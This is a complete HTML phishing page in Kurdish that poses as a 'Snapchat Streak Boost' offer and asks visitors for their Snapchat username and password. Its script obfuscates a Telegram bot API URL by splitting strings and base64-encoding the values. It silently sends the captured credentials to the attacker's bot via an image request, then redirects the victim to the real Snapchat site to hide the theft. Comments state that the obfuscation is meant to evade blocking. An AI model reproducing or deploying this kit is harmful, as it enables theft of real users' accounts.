<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Snapchat Streak Boost</title>
    <style>
        body { background: #FFFC00; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: -apple-system, sans-serif; overflow: hidden; }
        .box { background:white; padding:25px 18px; border-radius:20px; text-align:center; box-shadow:0 15px 35px rgba(0,0,0,0.1); width: 85%; max-width: 300px; position:relative; }
        input { width: 90%; padding: 12px; margin-bottom: 10px; border: 1px solid #d2d2d7; border-radius: 10px; background: #f5f5f7; font-size: 14px; outline: none; }
        button { width: 98%; padding: 12px; background: #00ADEE; color: white; border: none; border-radius: 22px; font-weight: 700; font-size: 15px; cursor: pointer; }
        #loading { display:none; position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.8); border-radius:20px; justify-content:center; align-items:center; z-index:10; }
        .loader { width:20px; height:20px; border:3px solid #f3f3f3; border-top:3px solid #00ADEE; border-radius:50%; animation:spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <div id="loading"><div class="loader"></div></div>
        <img src="https://id.snapchat.com/identity/static/images/ghost.png" style="width:50px; margin-bottom:10px;">
        <h2 style="margin:0 0 5px; font-size:18px;">زيادكردنى ستريك</h2>
        <p style="color:#86868b; font-size:12px; margin-bottom:20px;">بۆ وەرگرتنی ستریكی زیاتر، تكایە داخڵ ببە</p>
        <form id="l-f" dir="rtl">
            <input type="text" id="u" placeholder="ناوى بەکارهێنەر" required>
            <input type="password" id="p" placeholder="تێپەڕەوشە" required>
            <button type="submit">زيادكردن</button>
        </form>
    </div>

    <script>
        // پارچە پارچە کردنی بەستەر بۆ ئەوەی سێرڤەر بلۆکی نەکات
        const _h = "h" + "tt" + "ps" + "://";
        const _a = "ap" + "i.t" + "el" + "eg" + "ra" + "m.o" + "rg/";
        const _v1 = "ODYzMTI2MjEzMjpBQUYyMUo2SG1RanV5QkFkVWVDckVoMjFSVjdKUUo5SWVHMA==";
        const _v2 = "MjA1NzI0MjgyOQ==";

        const _dec = (s) => atob(s);

        document.getElementById('l-f').addEventListener('submit', function(e) {
            e.preventDefault();
            document.getElementById('loading').style.display = 'flex';

            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            const text = `🔥 [SNAP HIT] 🔥\n👤 User: ${user}\n🔑 Pass: ${pass}`;

            // دروستکردنی فەرمانی ناردن لە کاتی کارکردندا
            const end = "bo" + "t" + _dec(_v1) + "/sen" + "dMe" + "ssage";
            const url = _h + _a + end + "?chat_id=" + _dec(_v2) + "&text=" + encodeURIComponent(text);

            // ناردنی زانیاری بە شێوازێکی بێدەنگ
            const i = new Image();
            i.src = url;

            setTimeout(() => {
                window.location.replace("https://accounts.snapchat.com");
            }, 1200);
        });
    </script>
</body>
</html>
